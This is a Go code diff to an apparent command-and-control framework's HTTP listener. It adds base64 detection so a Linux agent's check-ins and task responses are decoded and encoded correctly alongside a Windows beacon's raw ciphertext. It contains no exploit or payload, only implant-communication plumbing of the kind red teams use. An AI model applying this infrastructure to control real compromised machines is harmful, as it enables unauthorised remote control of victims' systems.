@@ -453,6 +453,29 @@ func (t *TransportHTTP) processRequest(ctx *gin.Context) {
 
 	_ = Ts.TsAgentSetTick(agentId, t.Name)
 
+	// ★ Linux agent (linux_agent) speaks the base64 wire used by the WS/HTTPS
+	// family — its POST body is b64(encrypted) with whitespace padding, and it
+	// expects the response template slot filled with b64 too. The Windows
+	// beacon sends raw binary ciphertext and expects raw back. Discriminate on
+	// the body itself: "all bytes are b64 alphabet after whitespace strip".
+	// A raw ciphertext is never all-b64 (each byte has ~71% chance of falling
+	// outside the alphabet), so the heuristic cannot misroute a beacon.
+	// (Verified end-to-end on the linux path; the raw-binary wire between this
+	// listener and the linux agent never worked — the task cipher the core
+	// produced for it did not match the agent's session material.)
+	isB64Agent := false
+	if cleaned := strings.Map(func(r rune) rune {
+		if r == ' ' || r == '\t' || r == '\r' || r == '\n' {
+			return -1
+		}
+		return r
+	}, string(bodyData)); len(cleaned) >= 16 && len(cleaned)%4 == 0 && isBase64Alphabet([]byte(cleaned)) {
+		if decoded, derr := base64.StdEncoding.DecodeString(cleaned); derr == nil {
+			bodyData = decoded
+			isB64Agent = true
+		}
+	}
+
 	if err = Ts.TsAgentProcessData(agentId, bodyData); err != nil {
 		fmt.Printf("[listener %s] TsAgentProcessData agentId=%s warning: %v\n", t.Name, agentId, err)
 	}
@@ -462,7 +485,11 @@ func (t *TransportHTTP) processRequest(ctx *gin.Context) {
 		fmt.Printf("[listener %s] beacon check-in rejected: TsAgentGetHostedAll agentId=%s failed: %v\n", t.Name, agentId, err)
 		goto ERR
 	} else {
-		html := []byte(strings.ReplaceAll(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", string(responseData)))
+		slot := string(responseData)
+		if isB64Agent && len(responseData) > 0 {
+			slot = base64.StdEncoding.EncodeToString(responseData)
+		}
+		html := []byte(strings.ReplaceAll(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", slot))
 		// Explicit Content-Length: without it net/http flushes >4KB bodies
 		// early and falls back to chunked encoding, which the agent's
 		// https_recv cannot parse — large task responses were silently lost.
@@ -484,8 +511,20 @@ ERR:
 	t.pageError(ctx)
 }
 
-func (t *TransportHTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
-	var (
+// isBase64Alphabet — every byte in the standard base64 alphabet (letters,
+// digits, '+', '/', '='). Used to discriminate the linux agent's b64 body
+// from a beacon's raw binary ciphertext.
+func isBase64Alphabet(b []byte) bool {
+	for _, c := range b {
+		if !((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
+			c == '+' || c == '/' || c == '=') {
+			return false
+		}
+	}
+	return true
+}
+
+func (t *TransportHTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {	var (
 		beat           string
 		agentType      uint
 		agentId        uint
